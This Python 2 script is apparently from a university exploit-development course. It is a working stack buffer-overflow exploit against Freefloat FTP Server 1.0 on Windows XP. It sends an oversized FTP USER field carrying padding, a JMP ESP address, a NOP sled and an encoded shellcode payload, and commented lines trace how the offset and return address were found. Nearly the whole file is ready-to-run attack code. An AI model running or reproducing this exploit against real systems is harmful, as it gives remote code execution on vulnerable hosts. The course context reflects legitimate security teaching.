#!/usr/bin/python2

# Originally created in CPSC 62700 by Dr. Jason Perry
# Adapted for exploit of the Freefloat FTP Server 1.0 running on Windows XP
# By Kyle Healy
# 3/3/2019

import sys
import socket

def genPattern(n): #return n bytes of the pattern
    result = ""
    for l1 in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        for l2 in "abcdefghijklmnopqrstuvwxyz":
            for l3 in "0123456789":
                result += (l1+l2+l3)
    return result[0:n]

buf =  ""
buf += "\xba\xd2\xc1\xa4\x59\xda\xcb\xd9\x74\x24\xf4\x5e\x31"
buf += "\xc9\xb1\x52\x31\x56\x12\x83\xee\xfc\x03\x84\xcf\x46"
buf += "\xac\xd4\x38\x04\x4f\x24\xb9\x69\xd9\xc1\x88\xa9\xbd"
buf += "\x82\xbb\x19\xb5\xc6\x37\xd1\x9b\xf2\xcc\x97\x33\xf5"
buf += "\x65\x1d\x62\x38\x75\x0e\x56\x5b\xf5\x4d\x8b\xbb\xc4"
buf += "\x9d\xde\xba\x01\xc3\x13\xee\xda\x8f\x86\x1e\x6e\xc5"
buf += "\x1a\x95\x3c\xcb\x1a\x4a\xf4\xea\x0b\xdd\x8e\xb4\x8b"
buf += "\xdc\x43\xcd\x85\xc6\x80\xe8\x5c\x7d\x72\x86\x5e\x57"
buf += "\x4a\x67\xcc\x96\x62\x9a\x0c\xdf\x45\x45\x7b\x29\xb6"
buf += "\xf8\x7c\xee\xc4\x26\x08\xf4\x6f\xac\xaa\xd0\x8e\x61"
buf += "\x2c\x93\x9d\xce\x3a\xfb\x81\xd1\xef\x70\xbd\x5a\x0e"
buf += "\x56\x37\x18\x35\x72\x13\xfa\x54\x23\xf9\xad\x69\x33"
buf += "\xa2\x12\xcc\x38\x4f\x46\x7d\x63\x18\xab\x4c\x9b\xd8"
buf += "\xa3\xc7\xe8\xea\x6c\x7c\x66\x47\xe4\x5a\x71\xa8\xdf"
buf += "\x1b\xed\x57\xe0\x5b\x24\x9c\xb4\x0b\x5e\x35\xb5\xc7"
buf += "\x9e\xba\x60\x47\xce\x14\xdb\x28\xbe\xd4\x8b\xc0\xd4"
buf += "\xda\xf4\xf1\xd7\x30\x9d\x98\x22\xd3\xa8\x5c\x2e\x2c"
buf += "\xc5\x5e\x2e\x23\x49\xd6\xc8\x29\x61\xbe\x43\xc6\x18"
buf += "\x9b\x1f\x77\xe4\x31\x5a\xb7\x6e\xb6\x9b\x76\x87\xb3"
buf += "\x8f\xef\x67\x8e\xed\xa6\x78\x24\x99\x25\xea\xa3\x59"
buf += "\x23\x17\x7c\x0e\x64\xe9\x75\xda\x98\x50\x2c\xf8\x60"
buf += "\x04\x17\xb8\xbe\xf5\x96\x41\x32\x41\xbd\x51\x8a\x4a"
buf += "\xf9\x05\x42\x1d\x57\xf3\x24\xf7\x19\xad\xfe\xa4\xf3"
buf += "\x39\x86\x86\xc3\x3f\x87\xc2\xb5\xdf\x36\xbb\x83\xe0"
buf += "\xf7\x2b\x04\x99\xe5\xcb\xeb\x70\xae\xfc\xa1\xd8\x87"
buf += "\x94\x6f\x89\x95\xf8\x8f\x64\xd9\x04\x0c\x8c\xa2\xf2"
buf += "\x0c\xe5\xa7\xbf\x8a\x16\xda\xd0\x7e\x18\x49\xd0\xaa"

hostname = sys.argv[1]
# we will overflow the username buffer.
#username = "A"*768 #Smash the stack and overload the EIP register
#username = genPattern(768) #Create unique pattern to find offset within program
#username = "A"*246 + "BBBB" + "C"*(768-246-4) #Confirm offset is correct
jmpesp = '\x20\x10\xb4\x7c'
#username = "A"*246 + jmpesp + "\xcc"*(768-246-4) #Confirm jump esp and interrupt
nopsled = '\x90'*16 #16 bytes of NOP sled
username = "A"*246 + jmpesp + nopsled + buf + "\xcc"*(768-246-4-len(nopsled) - len(buf))
passwd = "anything"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect((hostname, 21))

except:
    print ('[-] Connection error!')
    sys.exit(1)

r = sock.recv(768) # get the servers banner
print "[+] " + r

# send the username and password
sock.send("user %s\r\n" % username)
r = sock.recv(768)
print "[+] " + r

sock.send("pass %s\r\n" % passwd)
r = sock.recv(768)
print "[+] " + r

sock.close()
